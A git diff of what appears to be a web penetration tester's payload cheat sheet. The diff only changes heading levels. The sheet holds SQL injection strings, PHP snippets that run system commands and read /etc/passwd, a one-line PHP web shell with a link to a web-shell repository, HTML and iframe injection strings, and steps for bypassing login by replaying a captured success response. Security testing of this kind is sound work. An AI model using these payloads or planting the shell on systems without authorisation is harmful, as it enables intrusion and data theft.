@@ -1,11 +1,11 @@
-### Time Based Blind SQL Injection:
+## Time Based Blind SQL Injection:
 ```
 '(select * from (select(sleep(10)))a)
 ';WAITFOR DELAY '0:0:30'--
 ```
-### Error Based SQL Injection:
+## Error Based SQL Injection:
 
-### Boolean Based Blind SQL Injection:
+## Boolean Based Blind SQL Injection:
 ```
 '2 OR 1=1
 ''2 OR 1=1
@@ -14,58 +14,58 @@
 ''2 AND 1=1
 "2 AND 1=1
 ```
-### Local File Inclusion (LFI):
+## Local File Inclusion (LFI):
 ```
 
 
 ```
-### Remote Code Execution (RCE):
+## Remote Code Execution (RCE):
 ```
 <?php system("cat /etc/passwd");?>
 <?php system("cat /etc/passwd");?>
 <?php echo phpinfo(); ?>
 <?php include 'C:\Windows\System32\drivers\etc\hosts';?>
 ```
-### Malicious File Upload (Shell Execution):
+## Malicious File Upload (Shell Execution):
 ```
 <?php system($_GET['cmd']); ?>
 
 https://github.com/hackerhijeck/For_Me/blob/main/Web_Shell.php
 ```
-### Application is Vulnerable to Reverse Web shell (Shell Execution):
+## Application is Vulnerable to Reverse Web shell (Shell Execution):
 ```
 
 ```
-### File Upload Bypass:
+## File Upload Bypass:
 ```
 ```
-### Session Hijacking:
+## Session Hijacking:
 ```
 
 ```
 ### Session Fixation in The Application
 ### Application is Vulnerable to Forceful Browsing
 ### Insecure Direct Object Reference
-### URL Redirection in the application:
-### Reflected Cross Site Scripting Attack
-### HTML Injection
+## URL Redirection in the application:
+## Reflected Cross Site Scripting Attack
+## HTML Injection
 ```
 <h1>HTML_Injection</h1>
 <marquee>HTML_Injection</marquee>
 ```
-### Link Injection:
+## Link Injection:
 ```
 <a href="https://www.intelliroot.com">Test</a>
 ```
-### Iframe Injection:
+## Iframe Injection:
 ```
 <iframe src="https://https://www.intelliroot.com"></iframe>
 ```
-### Blind Cross Site Scripting Attack:
+## Blind Cross Site Scripting Attack:
 ```
 XSS Hunter payload
 ```
-### Admin/User Login Authentication Bypass Using Success Response:
+## Admin/User Login Authentication Bypass Using Success Response:
 #### Process 1:
 ```
 Step1: Login panel capture the request and Do intercept and click to respnse to this request and then forward the request
@@ -78,8 +78,8 @@ Step2: Copy the 200 OK reponse data and save it any txt format.
 Step3: Now try to unathorized user, in login panel capture the request and "Do intercept" and click to "respnse to this request" and then forward the request.
 Step4: In Response data, paste the data which copied from a valid user, and then forward the request.
 ```
-### Cross Site Request Forgery (CSRF)
-### Restricted Functionality Access in the Application
+## Cross Site Request Forgery (CSRF)
+## Restricted Functionality Access in the Application
 ### Parameter Manipulation
 ### Test CGI script exposes environment variables
 ### Account Takeover through forget password
